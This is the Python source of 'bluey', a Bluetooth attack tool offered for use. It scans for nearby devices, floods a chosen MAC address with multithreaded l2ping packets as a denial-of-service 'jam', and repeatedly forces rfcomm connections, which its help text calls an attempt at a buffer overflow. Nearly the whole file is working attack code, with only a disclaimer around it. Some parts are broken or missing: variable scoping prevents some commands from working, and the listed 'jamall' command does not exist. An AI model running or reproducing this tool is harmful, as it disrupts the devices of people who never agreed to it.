import os
from bluetooth import *
import art
import subprocess
from alive_progress import alive_bar
import time
import threading

blocked_addr = []
global packetsize
global interface
global threads_count
os.system("clear")
art.tprint("bluey")
print("=====================================")
print("Author: Logan Goins\n")
print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")


def DOS(target, packetsize):
    os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + target)



def scan():

    try:
        
        print("Scanning for devices...")

        nearby_devices = discover_devices(lookup_names = True)
        

        print(" ")
        print("        Devices:\n")
        print("============================================")
        for name, addr in nearby_devices:
            print (" > %s - %s" % (addr, name))
            

        print(" \n")
        print("============================================")
        print ("found %d devices" % len(nearby_devices))
        print(" ")
    except OSError as error:
        print(error)
        print("Make sure your bluetooth adapter is up and connected")
        main()
        

def force_connect(target):
    if target == " ":
        print("Target MAC not set")
        main()

    print("attempting connection")
    connect=['rfcomm', 'connect', target, '1']
    items = range(1001)
    with alive_bar(len(items)) as bar:
        for item in items:   
            subprocess.call(connect)
            bar()



def jam(threads_count, packetsize):
   
    print("\x1b[31m[*] Starting DOS attack in 3 seconds...")

    for i in range(0, 3):
        print('[*] ' + str(3 - i))
        time.sleep(1)
    os.system('clear')

    print("Building Threads")
    for i in range(0, int(threads_count)):
         
        print('[*] Built thread №' + str(i + 1))
        threading.Thread(target=DOS, args=[str(target), str(packetsize)]).start()

    
    print('[*] Built all threads...')
    print('[*] Starting...')
    
def help_menu():
    print(" \n")
    print("Commands")
    print("--------------------------")
    print("scan                         ---  scans for bluetooth devices in the area")
    print("jam                          ---  jams devices using specified interface, target, and packet size")
    print("forceconnect                 ---  tries to cause a buffer overflow connection on vulnerable devices")
    print("set target <target>          ---  sets target MAC address for later use")
    print("set interface <interface>    ---  sets bluetooth interface for use")
    print("set packetsize <packet size> ---  sets packet size for use with the \"jam\" command (in bytes)")
    print("set threads <thread number>  ---  sets number of threads for attack")
    print("clear                        ---  clears terminal window")
    print("jamall                       ---  jam all devices as soon as detecting")
    print(" ")


def main():
    while True:
        prompt = "\nbluey/> "
        print(prompt, end="")

        command = input().split(" ")
        print(" ")
        if len(command) >= 3:
            cmd = command[0]
            subcmd = command[1]
            arg = command[2]
            params = [cmd, subcmd, arg]
        elif len(command) >= 2:
            cmd = command[0]
            subcmd = command[1]
            params = [cmd, subcmd]

        elif len(command) >= 1:
            cmd = command[0]
            params = [cmd]


        if cmd == "scan":
            scan()

        if cmd == "set" and subcmd == "target":
            global target
            target = arg
            print(target + " ---> target\n")


        if cmd == "set" and subcmd == "threads":
            
            threads_count = arg
            print(threads_count + " ---> threads\n")


        if cmd == "jam":
            if packetsize == "" or target == "" or threads_count == "":
                print("You need to set the packetsize, target, and threads for this command")
            jam(threads_count, packetsize)

        if cmd == "set" and subcmd == "packetsize":
            
            packetsize = arg
            print(packetsize + " ---> packet size\n")

        if cmd == "set" and subcmd == "interface" :
            
            interface = arg
            print(interface + " ---> bluetooth interface\n")

        if cmd == "forceconnect":
            force_connect(target)

        if cmd == "help":
            help_menu()
        
        if cmd == "clear":
            os.system("clear")

        if cmd == "exit" or cmd == "quit":
            exit()


if __name__ == "__main__":
    
    main()
